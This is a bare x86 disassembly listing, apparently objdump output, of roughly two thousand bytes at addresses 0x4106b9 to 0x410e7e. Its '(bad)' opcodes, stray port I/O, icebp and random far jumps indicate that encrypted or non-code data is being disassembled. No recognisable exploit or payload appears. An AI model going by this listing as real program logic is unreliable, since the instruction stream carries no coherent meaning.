  4106b9:	ror    DWORD PTR [esi],cl
  4106bb:	jns    0x41068d
  4106bd:	jo     0x410664
  4106bf:	test   DWORD PTR [ebp+0x5689d945],ebx
  4106c5:	aas    
  4106c6:	jmp    0xe26d42ad
  4106cb:	out    0x99,al
  4106cd:	test   al,0xd9
  4106cf:	adc    edx,ebp
  4106d1:	stc    
  4106d2:	dec    ebx
  4106d3:	adc    al,0xc
  4106d5:	mov    cl,0xbb
  4106d7:	mul    BYTE PTR [eax]
  4106d9:	mov    esp,0xf2ca7e15
  4106de:	outs   dx,DWORD PTR ds:[esi]
  4106df:	push   esp
  4106e0:	inc    edx
  4106e1:	call   0x5079c02f
  4106e6:	mov    ch,0x33
  4106e8:	xchg   esp,esi
  4106ea:	mov    edx,0x1c774ef2
  4106ef:	adc    BYTE PTR [ebx-0x8],bh
  4106f2:	inc    ebp
  4106f3:	push   es
  4106f4:	sbb    BYTE PTR [edx+0x1bf1aba4],bh
  4106fa:	(bad)  
  4106fb:	lods   eax,DWORD PTR ds:[esi]
  4106fc:	test   bl,ah
  4106fe:	pop    edi
  4106ff:	pop    ds
  410700:	mov    dl,0x27
  410702:	push   ecx
  410703:	cmc    
  410704:	pop    es
  410705:	ror    DWORD PTR [ebx+0x77f0e778],1
  41070b:	push   edx
  41070c:	dec    eax
  41070d:	icebp  
  41070e:	test   BYTE PTR [ebx-0x6f5cd176],dh
  410714:	xor    BYTE PTR [esi],dh
  410716:	pop    esi
  410717:	retf   0xb0
  41071a:	dec    ebx
  41071b:	imul   edi,DWORD PTR ds:0xc4461035,0xdb7931e2
  410725:	outs   dx,DWORD PTR ds:[esi]
  410726:	mov    bl,0xe4
  410728:	test   BYTE PTR [esi+0x27],cl
  41072b:	mov    cs,WORD PTR [esi]
  41072d:	pusha  
  41072e:	out    0xd0,al
  410730:	push   esi
  410731:	or     edx,ecx
  410733:	inc    ecx
  410734:	mov    ds:0xc7b72138,eax
  410739:	add    ebx,ebp
  41073b:	fs (bad) 
  41073d:	out    0xc4,eax
  41073f:	jg     0x4106c8
  410741:	stos   BYTE PTR es:[edi],al
  410742:	test   al,0xe8
  410744:	into   
  410745:	outs   dx,BYTE PTR ds:[esi]
  410746:	jnp    0x4106e6
  410748:	sub    ecx,DWORD PTR [eax-0x5b4d88f]
  41074e:	jo     0x41076b
  410750:	mov    ebp,0x9d2530ef
  410755:	icebp  
  410756:	setp   BYTE PTR [edx+0x7a0ecde1]
  41075d:	inc    ecx
  41075e:	mov    esp,0x23e8e613
  410763:	(bad)  
  410765:	push   esp
  410766:	xchg   ebx,eax
  410767:	mov    bl,0x70
  410769:	arpl   WORD PTR [ebp+0x62],ax
  41076c:	ret    0x15a7
  41076f:	push   0x63
  410771:	push   ebp
  410772:	mov    ds:0xdd9ec28f,eax
  410777:	and    BYTE PTR [ecx],dl
  410779:	adc    DWORD PTR [edx+0x71b34e8c],ebx
  41077f:	rcr    BYTE PTR [edi],0xb7
  410782:	and    DWORD PTR [ebx+0x4a],0xb8254094
  410789:	push   ss
  41078a:	jp     0x4107c5
  41078c:	aaa    
  41078d:	mov    dl,cl
  41078f:	sub    eax,0x1526802c
  410794:	(bad)  
  410795:	adc    eax,DWORD PTR [eax]
  410797:	data16 fisub DWORD PTR [edi-0x3883baba]
  41079e:	daa    
  41079f:	jbe    0x410764
  4107a1:	push   ecx
  4107a2:	lods   al,BYTE PTR ds:[esi]
  4107a3:	jnp    0x41081e
  4107a5:	inc    esi
  4107a6:	cmp    ebp,DWORD PTR ds:0xc9c0f1c
  4107ac:	sahf   
  4107ad:	sub    BYTE PTR [ebp+edi*1-0x4d],0xcf
  4107b2:	jmp    0x3571:0x40f4dbee
  4107b9:	push   ebx
  4107ba:	pushf  
  4107bb:	push   esi
  4107bc:	push   es
  4107bd:	and    DWORD PTR [eiz*4+0x4f4a3b71],0xc
  4107c5:	pusha  
  4107c6:	popf   
  4107c7:	ror    ah,1
  4107c9:	xor    ah,0x5d
  4107cc:	push   eax
  4107cd:	stos   BYTE PTR es:[edi],al
  4107ce:	aam    0xdb
  4107d0:	fs (bad) 
  4107d2:	out    dx,al
  4107d3:	xor    ebx,DWORD PTR [eax]
  4107d5:	sti    
  4107d6:	sar    BYTE PTR [ecx],cl
  4107d8:	icebp  
  4107d9:	sub    dl,dh
  4107db:	jae    0x410771
  4107dd:	mov    dh,0xa0
  4107df:	adc    DWORD PTR [edi],esp
  4107e1:	sub    dh,dh
  4107e3:	xlat   BYTE PTR ds:[ebx]
  4107e4:	xlat   BYTE PTR ds:[ebx]
  4107e5:	das    
  4107e6:	sbb    al,0x82
  4107e8:	fdiv   QWORD PTR [ebx+0x36342611]
  4107ee:	fdivr  QWORD PTR [ebx]
  4107f0:	nop
  4107f1:	frndint 
  4107f3:	out    0x2b,eax
  4107f5:	jl     0x4107c1
  4107f7:	rcl    DWORD PTR [ebp-0x102c772c],1
  4107fd:	daa    
  4107fe:	lea    edx,[edx+0x7]
  410801:	and    eax,0x4a567cdf
  410806:	loope  0x41081a
  410808:	dec    esp
  410809:	xchg   ebx,eax
  41080a:	retf   
  41080b:	xor    bl,bl
  41080d:	out    0xe3,eax
  41080f:	hlt    
  410810:	scas   al,BYTE PTR es:[edi]
  410811:	mov    dh,0x11
  410813:	and    al,0x43
  410815:	ror    cl,cl
  410817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410818:	mov    edx,DWORD PTR [ebp-0x34]
  41081b:	js     0x4107af
  41081d:	rcl    ah,cl
  41081f:	fistp  WORD PTR [edi+eiz*8]
  410822:	mov    edi,fs
  410824:	les    ebp,FWORD PTR [edi+0xd]
  410827:	xchg   ebp,eax
  410828:	pushf  
  410829:	xor    bh,BYTE PTR [eax]
  41082b:	ret    0x71f0
  41082e:	leave  
  41082f:	gs ss mov ah,0xdb
  410833:	mov    BYTE PTR [ecx+0x30db99c2],ch
  410839:	lods   eax,DWORD PTR ds:[esi]
  41083a:	mov    eax,ds:0x8ad428a7
  41083f:	(bad)  
  410840:	or     DWORD PTR [eax+0x446dd5a6],ecx
  410846:	sbb    BYTE PTR [eax-0x1a4c2a7e],bl
  41084c:	or     eax,0x541a72e3
  410851:	sbb    al,0x62
  410853:	out    0xe6,al
  410855:	lods   al,BYTE PTR ds:[esi]
  410856:	fild   WORD PTR [ebx-0x59]
  410859:	mov    bl,0x33
  41085b:	jg     0x4107de
  41085d:	add    BYTE PTR [esi],cl
  41085f:	les    ebx,FWORD PTR [ecx-0x7e]
  410862:	xchg   ecx,eax
  410863:	loope  0x41085c
  410865:	cmp    DWORD PTR [ebp-0x3f],ebp
  410868:	out    dx,al
  410869:	cld    
  41086a:	pop    edx
  41086b:	test   DWORD PTR [edi],edx
  41086d:	inc    esi
  41086e:	clc    
  41086f:	mov    ch,0xc6
  410871:	push   es
  410872:	pushf  
  410873:	adc    eax,0xc6d2c6b5
  410878:	out    dx,eax
  410879:	jbe    0x41088d
  41087b:	adc    eax,0x361a36fc
  410880:	or     edi,ebx
  410882:	add    dh,0x7a
  410885:	mov    eax,0x5dc4dc02
  41088a:	jno    0x410880
  41088c:	dec    edx
  41088d:	sbb    al,0x41
  41088f:	and    eax,0xf85ed9b9
  410894:	bound  esi,QWORD PTR [ebx-0x6bb0d897]
  41089a:	mov    eax,fs
  41089c:	or     eax,0x7cc8318d
  4108a1:	push   edi
  4108a2:	cmp    al,0x53
  4108a4:	fistp  QWORD PTR [edx+0x79]
  4108a7:	and    BYTE PTR [edx+0x63],dh
  4108aa:	and    al,0x2e
  4108ac:	jne    0x41091c
  4108ae:	xchg   esi,eax
  4108af:	fwait
  4108b0:	dec    ecx
  4108b1:	fstp   DWORD PTR [ebx+esi*1+0x38826ab]
  4108b8:	add    ch,BYTE PTR [ebp-0x61]
  4108bb:	(bad)  [eax-0x55]
  4108be:	inc    esi
  4108bf:	shl    BYTE PTR [ebx-0x42a59e75],0xdb
  4108c6:	ret    
  4108c7:	aas    
  4108c8:	int    0xd
  4108ca:	mov    edx,ss
  4108cc:	leave  
  4108cd:	sbb    dl,BYTE PTR [esi-0xd0ea17]
  4108d3:	jns    0x4108f8
  4108d5:	call   0x6ff0367e
  4108da:	bound  ecx,QWORD PTR [ecx-0x1d]
  4108dd:	inc    edx
  4108de:	sbb    ebp,0xc6dd3672
  4108e4:	and    DWORD PTR [esi],ecx
  4108e6:	cmp    al,0xc1
  4108e8:	hlt    
  4108e9:	scas   al,BYTE PTR es:[edi]
  4108ea:	int3   
  4108eb:	pop    es
  4108ec:	xor    edx,DWORD PTR [ebp+0x1d]
  4108ef:	loop   0x410886
  4108f1:	dec    ebp
  4108f2:	(bad)  
  4108f3:	cld    
  4108f4:	adc    eax,0xcb46f8b7
  4108f9:	mov    eax,DWORD PTR [edi]
  4108fb:	call   0x8bda:0x702b354a
  410902:	cmp    edi,DWORD PTR [esi+0x20]
  410905:	inc    esp
  410906:	aaa    
  410907:	xor    BYTE PTR [edx],ah
  410909:	sbb    bl,BYTE PTR [eax+0x50]
  41090c:	mov    ah,0xbb
  41090e:	mov    edi,0xd2ae38bb
  410913:	sub    al,BYTE PTR [ebx+eax*1+0x205b6be4]
  41091a:	in     eax,dx
  41091b:	xlat   BYTE PTR ds:[ebx]
  41091c:	adc    BYTE PTR [ebx-0x7afddd03],ch
  410922:	sbb    DWORD PTR [edx-0x16ff444e],esp
  410928:	xchg   bh,dl
  41092a:	test   eax,0x5bdcbd7d
  41092f:	pop    ebp
  410930:	daa    
  410931:	adc    BYTE PTR [edx],al
  410933:	dec    ecx
  410934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410935:	test   BYTE PTR [ecx+0x628f9107],dl
  41093b:	xchg   ebp,eax
  41093c:	ret    
  41093d:	add    DWORD PTR [ecx-0x50acf757],edi
  410943:	imul   esp,DWORD PTR [eax-0x26],0xffffffdc
  410947:	xchg   ebp,eax
  410948:	or     DWORD PTR [eax],0x75
  41094b:	daa    
  41094c:	cli    
  41094d:	outs   dx,DWORD PTR ds:[esi]
  41094e:	ret    
  41094f:	pusha  
  410950:	mov    dl,0xa6
  410952:	retf   0xfe23
  410955:	popa   
  410956:	out    dx,eax
  410957:	mov    eax,ds:0x89e53883
  41095c:	inc    ecx
  41095d:	je     0x4109b7
  41095f:	jg     0x4109bc
  410961:	lds    eax,FWORD PTR [edx]
  410963:	xchg   edi,eax
  410964:	adc    bl,BYTE PTR [ebp+0x7acb0916]
  41096a:	adc    edx,DWORD PTR [eax-0x4a883c26]
  410970:	ss xchg edi,eax
  410972:	add    eax,0x1b86dc68
  410977:	arpl   WORD PTR [esi+0x4ba83c4e],ax
  41097d:	imul   eax,DWORD PTR [ebx-0x75],0x64fcbc82
  410984:	mov    ebx,0x972b16a3
  410989:	out    0xa6,al
  41098b:	mov    cs,WORD PTR [ebx]
  41098d:	adc    dh,cl
  41098f:	adc    esp,DWORD PTR [ebx-0x3f8120d0]
  410995:	mov    ch,0xa9
  410997:	push   es
  410998:	cmp    DWORD PTR [eax+0x2eb38a0f],edi
  41099e:	sbb    esp,edi
  4109a0:	clc    
  4109a1:	cli    
  4109a2:	add    al,BYTE PTR ss:[eax]
  4109a5:	out    0x32,eax
  4109a7:	fincstp 
  4109a9:	int    0x8c
  4109ab:	imul   ecx,DWORD PTR ds:0x5cd01900,0x6751163e
  4109b5:	dec    ebp
  4109b6:	in     al,dx
  4109b7:	inc    ecx
  4109b8:	mov    ecx,DWORD PTR [ebx+0x1f]
  4109bb:	inc    ecx
  4109bc:	iret   
  4109bd:	mov    esp,0xe303f5c9
  4109c2:	rol    BYTE PTR [ecx],cl
  4109c4:	jae    0x410985
  4109c6:	sub    eax,0xe7534b61
  4109cb:	pop    esi
  4109cc:	pop    ebx
  4109cd:	hlt    
  4109ce:	mov    ecx,0x1bc2937b
  4109d3:	mov    es,esp
  4109d5:	fldenv [esi-0x6fb58d1d]
  4109db:	js     0x410a36
  4109dd:	and    dl,BYTE PTR [ebp+0x3]
  4109e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109e1:	clc    
  4109e2:	mov    edi,0x91044da0
  4109e7:	xchg   ebp,eax
  4109e8:	and    BYTE PTR [ebx],0x87
  4109eb:	push   ds
  4109ec:	xor    BYTE PTR [esi-0x4ffbf452],0xfe
  4109f3:	icebp  
  4109f4:	xchg   BYTE PTR [ebp-0x307cea2b],bl
  4109fa:	mov    ah,0xe3
  4109fc:	mov    BYTE PTR [edi],dh
  4109fe:	in     al,dx
  4109ff:	adc    dh,BYTE PTR [ebx+0x58]
  410a02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a04:	fsub   DWORD PTR [ebx+0x75]
  410a07:	cmc    
  410a08:	sub    eax,0x156f0afb
  410a0d:	lea    edi,[esi+0x6db90d5c]
  410a13:	jns    0x410a1e
  410a15:	retf   
  410a16:	push   esp
  410a17:	xchg   al,dl
  410a19:	adc    ah,BYTE PTR [eax+esi*1-0x7045f633]
  410a20:	inc    ecx
  410a21:	mov    al,ds:0xbf43a23a
  410a26:	push   ss
  410a27:	in     eax,0x29
  410a29:	retf   
  410a2a:	inc    eax
  410a2b:	dec    eax
  410a2c:	retf   
  410a2d:	add    dh,BYTE PTR [edi+0x77]
  410a30:	mov    ds:0x27db4059,eax
  410a35:	xor    dl,dh
  410a37:	add    BYTE PTR [ebx-0x23cffc1b],ch
  410a3d:	out    0xe5,eax
  410a3f:	add    eax,0xd087024a
  410a44:	imul   edi,DWORD PTR [eax-0x1d],0x2ac0db4a
  410a4b:	adc    BYTE PTR [ecx-0x9],ch
  410a4e:	fbld   TBYTE PTR [esi+ecx*8]
  410a51:	fimul  DWORD PTR [edx]
  410a53:	push   cs
  410a54:	outs   dx,BYTE PTR ds:[esi]
  410a55:	icebp  
  410a56:	push   ecx
  410a57:	lods   al,BYTE PTR ds:[esi]
  410a58:	sbb    cl,al
  410a5a:	xchg   esi,eax
  410a5b:	dec    edi
  410a5c:	and    bh,cl
  410a5e:	or     edi,ebx
  410a60:	ror    BYTE PTR [ebp-0x65e68d6],0xec
  410a67:	arpl   dx,sp
  410a69:	xchg   BYTE PTR [ebx-0x43a4f161],ah
  410a6f:	xchg   ecx,eax
  410a70:	(bad)  
  410a71:	call   0x90ac:0x3fbcbe4c
  410a78:	pop    esp
  410a79:	fwait
  410a7a:	test   dh,ah
  410a7c:	or     BYTE PTR [edx-0x24d5728a],dh
  410a82:	test   DWORD PTR [ebx+edi*4-0x470773de],eax
  410a89:	idiv   BYTE PTR [esp+ecx*8+0x48]
  410a8d:	jae    0x410abd
  410a8f:	fwait
  410a90:	mov    ds:0xd819794f,al
  410a95:	cmp    eax,0x332dd961
  410a9a:	jno    0x410ad7
  410a9c:	arpl   WORD PTR [edx-0x52],di
  410a9f:	sti    
  410aa0:	xchg   esp,eax
  410aa1:	xor    DWORD PTR [ebx-0x7b],0x2e5bdf03
  410aa8:	shr    DWORD PTR [ebx+0x8899c3f],1
  410aae:	shl    cl,0x2a
  410ab1:	cdq    
  410ab2:	xor    BYTE PTR [ebx-0x3b53f46e],dl
  410ab8:	pop    ds
  410ab9:	sub    al,0x8a
  410abb:	(bad)  
  410abc:	fnstsw WORD PTR [ebx-0x49353f4a]
  410ac2:	inc    eax
  410ac3:	jae    0x410b22
  410ac5:	enter  0xa1ba,0xc0
  410ac9:	repnz and al,0x4a
  410acc:	mov    ebx,0x629fb7f1
  410ad1:	lea    ecx,fs:[ebx]
  410ad4:	sar    cl,1
  410ad6:	loopne 0x410b48
  410ad8:	add    edx,DWORD PTR [ecx]
  410ada:	xor    bl,BYTE PTR [edx]
  410adc:	cdq    
  410add:	mov    esp,0xec9139eb
  410ae2:	xchg   esi,edx
  410ae4:	outs   dx,DWORD PTR ds:[esi]
  410ae5:	es (bad) 
  410ae8:	jo     0x410b08
  410aea:	add    al,0xa9
  410aec:	xchg   esi,eax
  410aed:	loope  0x410b37
  410aef:	(bad)  
  410af0:	adc    edi,DWORD PTR [ebp+0x50]
  410af3:	xchg   ebx,eax
  410af4:	add    eax,DWORD PTR ds:0x59c54008
  410afa:	clc    
  410afb:	sbb    BYTE PTR [ebp-0x4b],ch
  410afe:	lods   al,BYTE PTR ds:[esi]
  410aff:	push   ss
  410b00:	lock push ss
  410b02:	mov    edx,fs
  410b04:	mov    edi,0x2b6cb5f9
  410b09:	sub    edx,DWORD PTR [edx+eax*4]
  410b0c:	inc    eax
  410b0d:	mov    eax,ds:0x2d0053b4
  410b12:	sub    BYTE PTR [ebx],dh
  410b14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b15:	sub    dl,BYTE PTR [edx-0x6b]
  410b18:	or     dh,BYTE PTR [eax]
  410b1a:	and    ah,BYTE PTR [ebx-0x64a72524]
  410b20:	jne    0x410b4e
  410b22:	fldenv [edi+ecx*2]
  410b25:	cmp    DWORD PTR [edx-0x1e],eax
  410b28:	stc    
  410b29:	push   ds
  410b2a:	mov    ds:0x3a9bb9e,al
  410b2f:	xchg   edx,eax
  410b30:	dec    esp
  410b31:	inc    edi
  410b32:	popf   
  410b33:	push   0xcd485175
  410b38:	sub    DWORD PTR [esi-0x18],0xffffff81
  410b3c:	clc    
  410b3d:	pop    ebx
  410b3e:	cmp    ecx,DWORD PTR [edx+ebp*2]
  410b41:	ret    0xba38
  410b44:	xor    DWORD PTR [ebp-0x727a260],esi
  410b4a:	xchg   BYTE PTR [edx*8+0xdd4e85e],bl
  410b51:	retf   0x81d8
  410b54:	inc    ecx
  410b55:	js     0x410b06
  410b57:	mov    eax,0x744fe2d5
  410b5c:	int    0x29
  410b5e:	adc    eax,0xda427b54
  410b63:	jae    0x410b1d
  410b65:	test   DWORD PTR [esi],edi
  410b67:	mov    eax,0x47c065ed
  410b6c:	ins    DWORD PTR es:[edi],dx
  410b6d:	dec    eax
  410b6e:	jecxz  0x410b89
  410b70:	inc    ecx
  410b71:	dec    eax
  410b72:	ret    0x4553
  410b75:	xchg   ebp,eax
  410b76:	and    eax,0x64dc9afc
  410b7b:	adc    ebx,DWORD PTR es:[ecx-0x6a]
  410b7f:	ins    DWORD PTR es:[edi],dx
  410b80:	retf   0xcde9
  410b83:	div    edx
  410b85:	les    edx,FWORD PTR [esp+ebx*8]
  410b88:	jecxz  0x410bcf
  410b8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b8b:	push   es
  410b8c:	jbe    0x410b58
  410b8e:	dec    edi
  410b8f:	add    dl,al
  410b91:	pop    ss
  410b92:	jo     0x410be2
  410b94:	push   eax
  410b95:	cmp    eax,0x82b9e5b
  410b9a:	jmp    0x518c:0xae99e21f
  410ba1:	mov    edi,DWORD PTR [eax]
  410ba3:	cmp    ecx,DWORD PTR [eax+0x6441015d]
  410ba9:	push   ebx
  410baa:	scas   eax,DWORD PTR es:[edi]
  410bab:	les    edi,FWORD PTR [eax-0x769de5ca]
  410bb1:	test   si,bp
  410bb4:	jmp    0x9d51:0x8079f181
  410bbb:	ins    DWORD PTR es:[edi],dx
  410bbc:	push   edx
  410bbd:	dec    ecx
  410bbe:	sbb    BYTE PTR [ecx-0x6bf623d4],bl
  410bc4:	sbb    DWORD PTR [ebx-0x80],esi
  410bc7:	inc    eax
  410bc8:	sbb    al,0x4c
  410bca:	jno    0x410c13
  410bcc:	es xchg ecx,eax
  410bce:	xchg   ecx,eax
  410bcf:	rol    DWORD PTR [esi+0xf9aefef],cl
  410bd5:	and    al,0x48
  410bd7:	pop    esi
  410bd8:	(bad)  
  410bda:	stc    
  410bdb:	mov    BYTE PTR [edi+esi*8],bh
  410bde:	mov    esi,0x2d65bc3a
  410be3:	mov    cl,0x5b
  410be5:	in     al,dx
  410be6:	sub    esp,DWORD PTR [ebp+edx*4+0x506d6c82]
  410bed:	jb     0x410be9
  410bef:	pop    edx
  410bf0:	dec    edi
  410bf1:	bound  eax,QWORD PTR ds:0xaa25e437
  410bf7:	or     eax,0xc0a3f45f
  410bfc:	test   al,0x5d
  410bfe:	sbb    ah,BYTE PTR [ecx]
  410c00:	cmp    eax,0x54aff5ba
  410c05:	stos   BYTE PTR es:[edi],al
  410c06:	or     al,0x6b
  410c08:	test   BYTE PTR [eax],0xfd
  410c0b:	add    BYTE PTR [ecx+edi*2],cl
  410c0e:	sbb    esp,DWORD PTR [edi-0x705366d5]
  410c14:	mov    edx,0x24bf181c
  410c19:	sub    eax,0x8a658c71
  410c1e:	cmc    
  410c1f:	retf   
  410c20:	sbb    ecx,DWORD PTR [ebx+0x26]
  410c23:	repnz add al,0x10
  410c26:	inc    ebp
  410c27:	(bad)  
  410c28:	jmp    0x618f8b32
  410c2d:	and    bh,cl
  410c2f:	(bad)  
  410c30:	xor    eax,0xb297be13
  410c35:	cwde   
  410c36:	lds    esp,FWORD PTR [ebx]
  410c38:	add    eax,0x3e1839cd
  410c3d:	push   edx
  410c3e:	push   ds
  410c3f:	jns    0x410cac
  410c41:	fs push 0xa7d2c6e3
  410c47:	retf   
  410c48:	aaa    
  410c49:	test   dh,0xa3
  410c4c:	xor    DWORD PTR [edx-0x2ec79648],ecx
  410c52:	sti    
  410c53:	(bad)  
  410c54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c55:	adc    eax,0x8ab965a4
  410c5a:	push   0x397c8acb
  410c5f:	ins    DWORD PTR es:[edi],dx
  410c60:	mov    ds:0x6d6e1896,eax
  410c65:	in     al,dx
  410c66:	inc    DWORD PTR [edx-0x694bfbc6]
  410c6c:	icebp  
  410c6d:	jmp    0xaee4:0xdfd0d5ff
  410c74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c75:	xlat   BYTE PTR ds:[ebx]
  410c76:	mov    bh,0xfa
  410c78:	popf   
  410c79:	test   BYTE PTR [ebx+edx*8],0x35
  410c7d:	sbb    eax,0x31c290f2
  410c82:	not    BYTE PTR [ebp-0x51]
  410c85:	sbb    BYTE PTR [eax+eiz*1+0x66ab6f2d],0x8
  410c8d:	xor    DWORD PTR [ebx-0x54],esi
  410c90:	aaa    
  410c91:	lea    ebp,[esi+0x7a6f50dc]
  410c97:	xchg   esp,eax
  410c98:	lea    ebp,ds:0xb0e919fc
  410c9e:	ins    DWORD PTR es:[edi],dx
  410c9f:	call   0xd4dfb325
  410ca4:	cmp    cl,al
  410ca6:	adc    BYTE PTR [eax+0x3c],bh
  410ca9:	push   eax
  410caa:	daa    
  410cab:	jle    0x410c6a
  410cad:	mov    eax,0x7be385d9
  410cb2:	in     eax,dx
  410cb3:	mov    eax,0x2f2bd25d
  410cb8:	fsub   DWORD PTR [ebx]
  410cba:	fcomp  QWORD PTR [edx]
  410cbc:	or     al,0xd
  410cbe:	hlt    
  410cbf:	or     DWORD PTR [edx+0x6629c989],esp
  410cc5:	xlat   BYTE PTR ds:[ebx]
  410cc6:	lods   eax,DWORD PTR ds:[esi]
  410cc7:	cli    
  410cc8:	(bad)  
  410cc9:	iret   
  410cca:	daa    
  410ccb:	pop    esi
  410ccc:	mov    gs,ebx
  410cce:	add    eax,0xba2f8d32
  410cd3:	xchg   ebx,eax
  410cd4:	test   bh,dh
  410cd6:	iret   
  410cd7:	lock or esp,edi
  410cda:	push   ss
  410cdb:	push   ds
  410cdc:	add    BYTE PTR [ebp+ebp*8+0x53a05ba7],bl
  410ce3:	ja     0x410d4c
  410ce5:	inc    edi
  410ce6:	push   ds
  410ce7:	fwait
  410ce8:	sti    
  410ce9:	les    esp,FWORD PTR [esi]
  410ceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cec:	sbb    al,0xc6
  410cee:	mov    bl,0x27
  410cf0:	adc    al,0x68
  410cf2:	and    edx,DWORD PTR ds:0x8fe01774
  410cf8:	stos   BYTE PTR es:[edi],al
  410cf9:	clc    
  410cfa:	xchg   esp,eax
  410cfb:	iret   
  410cfc:	lea    ebx,[edx+0x3b]
  410cff:	pop    edi
  410d00:	mov    al,ds:0x7f2734c2
  410d05:	jns    0x410c96
  410d07:	cwde   
  410d08:	clc    
  410d09:	stos   DWORD PTR es:[edi],eax
  410d0a:	icebp  
  410d0b:	inc    esi
  410d0c:	mov    ds,WORD PTR [edi+0x20]
  410d0f:	scas   eax,DWORD PTR es:[edi]
  410d10:	mov    ch,bh
  410d12:	adc    BYTE PTR [eax-0x21e7e555],0xb6
  410d19:	test   eax,0x3d6c62f8
  410d1e:	loope  0x410d13
  410d20:	mov    DWORD PTR [bx+di-0x5f],edx
  410d24:	imul   esp,DWORD PTR [ebx],0x590039d4
  410d2a:	retf   
  410d2b:	sahf   
  410d2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d2d:	aaa    
  410d2e:	jle    0x410d94
  410d30:	xchg   edi,eax
  410d31:	rcl    BYTE PTR [edx],1
  410d33:	mov    eax,ds:0x7d255cf8
  410d38:	mov    dl,0x8e
  410d3a:	pop    eax
  410d3b:	jecxz  0x410d67
  410d3d:	mov    BYTE PTR [edx],dl
  410d3f:	imul   esp,DWORD PTR [edi+0x2c],0x1713173d
  410d46:	mov    bh,0x3d
  410d48:	pop    esi
  410d49:	dec    ebx
  410d4a:	loop   0x410d50
  410d4c:	lock ror eax,1
  410d4f:	cmp    esi,DWORD PTR [edi-0x17854830]
  410d55:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  410d57:	pop    ebp
  410d58:	dec    esp
  410d59:	mov    ah,BYTE PTR [ebp+0x7cc38e23]
  410d5f:	(bad)  
  410d60:	ds imul edi,ecx,0xecba3dbf
  410d67:	std    
  410d68:	call   FWORD PTR [esi-0x4ce1a038]
  410d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d6f:	cdq    
  410d70:	mov    bh,BYTE PTR [edx+0x4e6003ba]
  410d76:	js     0x410db3
  410d78:	xchg   esi,eax
  410d79:	outs   dx,DWORD PTR ds:[esi]
  410d7a:	fisttp WORD PTR [ebp+0x34]
  410d7d:	bound  edi,QWORD PTR [esi-0x2d]
  410d80:	stos   BYTE PTR es:[edi],al
  410d81:	jmp    0x4152b54b
  410d86:	mov    esi,0xa4742736
  410d8b:	or     eax,ecx
  410d8d:	bound  esp,QWORD PTR [edi]
  410d8f:	dec    ebx
  410d90:	sbb    ch,ah
  410d92:	sub    ebx,ecx
  410d94:	jle    0x410dad
  410d96:	aam    0x9d
  410d98:	retf   
  410d99:	(bad)  
  410d9a:	jle    0x410d5d
  410d9c:	mov    al,ds:0xac1f0d3
  410da1:	jmp    0xf17d:0x2a506ba6
  410da8:	out    0x27,al
  410daa:	adc    ebx,DWORD PTR [ebx+ecx*1]
  410dad:	dec    edi
  410dae:	and    ebx,DWORD PTR [esi-0xb1379f3]
  410db4:	or     BYTE PTR [eax],ch
  410db6:	aaa    
  410db7:	add    ah,bl
  410db9:	lods   al,BYTE PTR ds:[esi]
  410dba:	sbb    al,0x42
  410dbc:	cmp    DWORD PTR [ecx-0x77],edi
  410dbf:	mov    bh,0xbf
  410dc1:	or     al,0xd3
  410dc3:	mov    eax,ds:0x69be15fb
  410dc8:	jo     0x410e2a
  410dca:	fnstenv ds:0x862c663
  410dd0:	out    0x70,eax
  410dd2:	jecxz  0x410dce
  410dd4:	inc    eax
  410dd5:	jl     0x410d9e
  410dd7:	in     eax,dx
  410dd8:	rol    BYTE PTR [esi],cl
  410dda:	cdq    
  410ddb:	mul    ebp
  410ddd:	lahf   
  410dde:	jne    0x410dc2
  410de0:	push   edi
  410de1:	loope  0x410e62
  410de3:	push   es
  410de4:	test   ecx,eax
  410de6:	mov    WORD PTR [eax+0x54],fs
  410de9:	leave  
  410dea:	adc    BYTE PTR [ecx],cl
  410dec:	pop    edi
  410ded:	and    edi,DWORD PTR [ebx+0x21]
  410df0:	mov    dh,0xcc
  410df2:	mov    ah,0x67
  410df4:	jno    0x410d95
  410df6:	mov    eax,DWORD PTR ds:0xd03d860
  410dfc:	je     0x410da6
  410dfe:	retf   0x34fc
  410e01:	or     edi,edi
  410e03:	inc    ecx
  410e04:	sbb    eax,0x9322d78c
  410e09:	data16 mov ah,0xc6
  410e0c:	add    ecx,DWORD PTR [edi+eax*8]
  410e0f:	outs   dx,DWORD PTR ds:[esi]
  410e10:	enter  0xf44b,0x41
  410e14:	fcom   QWORD PTR [edx+eiz*1+0x4f335067]
  410e1b:	call   0xd601:0xffd257c4
  410e22:	int3   
  410e23:	sub    BYTE PTR [ebx+ebp*4+0x23],0xed
  410e28:	dec    edx
  410e29:	sub    dh,BYTE PTR [edx]
  410e2b:	pop    esp
  410e2c:	ret    
  410e2d:	and    eax,0x35a901bc
  410e32:	mov    ah,0xa3
  410e34:	dec    ecx
  410e35:	ret    0xed33
  410e38:	loopne 0x410e99
  410e3a:	mov    BYTE PTR [ebx+0x47bbd48e],dh
  410e40:	and    edi,DWORD PTR [esi+0x4b]
  410e43:	ret    0xe356
  410e46:	(bad)  
  410e48:	stos   DWORD PTR es:[edi],eax
  410e49:	adc    ebp,DWORD PTR [esi+0x6fbc475b]
  410e4f:	sub    esi,edx
  410e51:	ficomp DWORD PTR [ebx+0x11c0b561]
  410e57:	in     eax,0x14
  410e59:	call   0xe7018bc1
  410e5e:	nop
  410e5f:	das    
  410e60:	sub    eax,0x199a35b9
  410e65:	out    0xe,eax
  410e67:	sahf   
  410e68:	and    dl,BYTE PTR [edx]
  410e6a:	xchg   esp,eax
  410e6b:	pop    ss
  410e6c:	xchg   ecx,eax
  410e6d:	cmp    eax,0x3b064e3a
  410e72:	les    esp,FWORD PTR [eax+0x4f0ae0e3]
  410e78:	dec    eax
  410e79:	mov    BYTE PTR [edx],cl
  410e7b:	pushf  
  410e7c:	test   al,0xfb
  410e7e:	and    eax,0xed82055a
